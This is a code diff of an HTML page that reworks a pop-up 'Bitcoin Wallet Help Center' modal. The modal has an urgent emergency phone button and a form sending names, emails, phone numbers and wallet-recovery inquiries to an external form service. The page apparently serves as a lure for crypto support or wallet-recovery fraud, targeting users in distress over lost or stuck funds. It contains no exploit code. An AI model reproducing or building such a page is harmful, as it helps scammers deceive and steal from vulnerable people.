@@ -16,53 +16,55 @@
 </head>
 
 <body class="bg-[#0a0e1f] text-white">
-  <!-- Pop-up Modal -->
-  <div id="helpcenter-popup" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden transform scale-90 opacity-0 transition-all duration-300 ease-in-out">
-    <div class="bg-[#161b2b] rounded-lg p-6 sm:p-8 max-w-lg w-full mx-4 relative">
-      <!-- Close Button -->
-      <button onclick="closePopup()" class="absolute top-3 right-3 text-white/60 hover:text-white">
-        <i class="fas fa-times text-lg"></i>
-      </button>
-      <!-- Pop-up Header -->
-      <h2 class="text-center text-white font-extrabold text-xl sm:text-2xl mb-4">
-        Crypto Wallet Helpcenter & ETFs Investments
-      </h2>
-      <p class="text-center text-white/70 text-xs sm:text-sm mb-6">
-        Need help with your crypto wallet or interested in ETF investments? Fill out the form or call us now!
-      </p>
-      <!-- Pop-up Form -->
-      <form action="https://formspree.io/f/mwpbynkw" method="POST" class="grid grid-cols-1 gap-4 text-[9px]">
-        <input type="text" name="fullname" placeholder="Full Name *" required
-          class="bg-[#0a0e1f] rounded-md px-3 py-2 text-white placeholder-white/60 focus:outline-none focus:ring-2 focus:ring-[#7c7edb]" />
-        <input type="email" name="email" placeholder="Email Address *" required
-          class="bg-[#0a0e1f] rounded-md px-3 py-2 text-white placeholder-white/60 focus:outline-none focus:ring-2 focus:ring-[#7c7edb]" />
-        <input type="tel" name="phone" placeholder="Phone Number *" required
-          class="bg-[#0a0e1f] rounded-md px-3 py-2 text-white placeholder-white/60 focus:outline-none focus:ring-2 focus:ring-[#7c7edb]" />
-        <select name="inquiry_type" required
-          class="bg-[#0a0e1f] rounded-md px-3 py-2 text-white placeholder-white/60 focus:outline-none focus:ring-2 focus:ring-[#7c7edb]">
-          <option disabled selected>Select Inquiry Type *</option>
-          <option>Wallet Recovery</option>
-          <option>Stuck Transaction</option>
-          <option>ETF Investment</option>
-          <option>Other Crypto Issue</option>
-        </select>
-        <textarea name="message" required placeholder="Describe your issue or inquiry..." rows="3"
-          class="bg-[#0a0e1f] rounded-md px-3 py-2 text-white placeholder-white/60 focus:outline-none focus:ring-2 focus:ring-[#7c7edb]"></textarea>
-        <button type="submit"
-          class="bg-[#7c7edb] text-white px-4 py-2 rounded-md font-semibold hover:bg-[#6568c4] transition-colors">
-          Submit Inquiry
-        </button>
-      </form>
+<!-- Pop-up Modal -->
+<div id="helpcenter-popup" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden transform scale-90 opacity-0 transition-all duration-300 ease-in-out">
+  <div class="bg-[#161b2b] rounded-lg p-8 sm:p-10 max-w-2xl w-full mx-4 relative">
+    <!-- Close Button -->
+    <button onclick="closePopup()" class="absolute top-4 right-4 text-white/70 hover:text-white">
+      <i class="fas fa-times text-xl"></i>
+    </button>
+    <!-- Pop-up Header -->
+    <h2 class="text-center text-white font-extrabold text-2xl sm:text-3xl mb-5">
+        Bitcoin Wallet Help Center
+    </h2>
+    <p class="text-center text-white/70 text-sm sm:text-base mb-8">
+      Need help with your crypto wallet?  Get Help with (BTC-ETH-XRP and all Cryptocurrency) , Get Help With hard Wallets Immediately.
+    </p>
+
       <!-- Emergency Call Button -->
-      <div class="mt-6 text-center">
-        <p class="text-white font-semibold mb-3">Emergency? Call Us Now!</p>
-        <button onclick="callSupport()"
-          class="bg-gradient-to-r from-[#ff4d4d] to-[#ff6a6a] px-4 py-2 rounded-full text-sm font-bold tracking-widest text-white flex items-center gap-2 mx-auto hover:brightness-110 hover:scale-105 transition-all duration-300 shadow-lg">
-          <i class="fas fa-phone-alt text-lg"></i> +1-888-319-4703 
-        </button>
-      </div>
+    <div class="mt-8 text-center">
+      <p class="text-white font-semibold mb-4 text-lg">Emergency? Call Us Now!</p>
+      <button onclick="callSupport()"
+        class="bg-gradient-to-r from-[#ff4d4d] to-[#ff6a6a] px-6 py-3 rounded-full text-base font-bold tracking-wider text-white flex items-center gap-2 mx-auto hover:brightness-110 hover:scale-105 transition-all duration-300 shadow-lg">
+        <i class="fas fa-phone-alt text-lg"></i> +1-888-319-4703 
+      </button>
     </div>
+  
+    <!-- Pop-up Form -->
+    <form action="https://formspree.io/f/mwpbynkw" method="POST" class="grid grid-cols-1 gap-5 text-sm">
+      <input type="text" name="fullname" placeholder="Full Name *" required
+        class="bg-[#0a0e1f] rounded-md px-4 py-3 text-white placeholder-white/60 text-base focus:outline-none focus:ring-2 focus:ring-[#7c7edb]" />
+      <input type="email" name="email" placeholder="Email Address *" required
+        class="bg-[#0a0e1f] rounded-md px-4 py-3 text-white placeholder-white/60 text-base focus:outline-none focus:ring-2 focus:ring-[#7c7edb]" />
+      <input type="tel" name="phone" placeholder="Phone Number *" required
+        class="bg-[#0a0e1f] rounded-md px-4 py-3 text-white placeholder-white/60 text-base focus:outline-none focus:ring-2 focus:ring-[#7c7edb]" />
+      <select name="inquiry_type" required
+        class="bg-[#0a0e1f] rounded-md px-4 py-3 text-white placeholder-white/60 text-base focus:outline-none focus:ring-2 focus:ring-[#7c7edb]">
+        <option disabled selected>Select Inquiry Type *</option>
+        <option>Wallet Recovery</option>
+        <option>Stuck Transaction</option>
+        <option>ETF Investment</option>
+        <option>Other Crypto Issue</option>
+      </select>
+      <textarea name="message" required placeholder="Describe your issue or inquiry..." rows="4"
+        class="bg-[#0a0e1f] rounded-md px-4 py-3 text-white placeholder-white/60 text-base focus:outline-none focus:ring-2 focus:ring-[#7c7edb]"></textarea>
+      <button type="submit"
+        class="bg-[#7c7edb] text-white px-6 py-3 rounded-md font-semibold hover:bg-[#6568c4] transition-colors text-base">
+        Submit Inquiry
+      </button>
+    </form>
   </div>
+</div>
 
   <!-- Header Section -->
   <header
@@ -399,4 +401,5 @@
 
 
 </html>
+
 
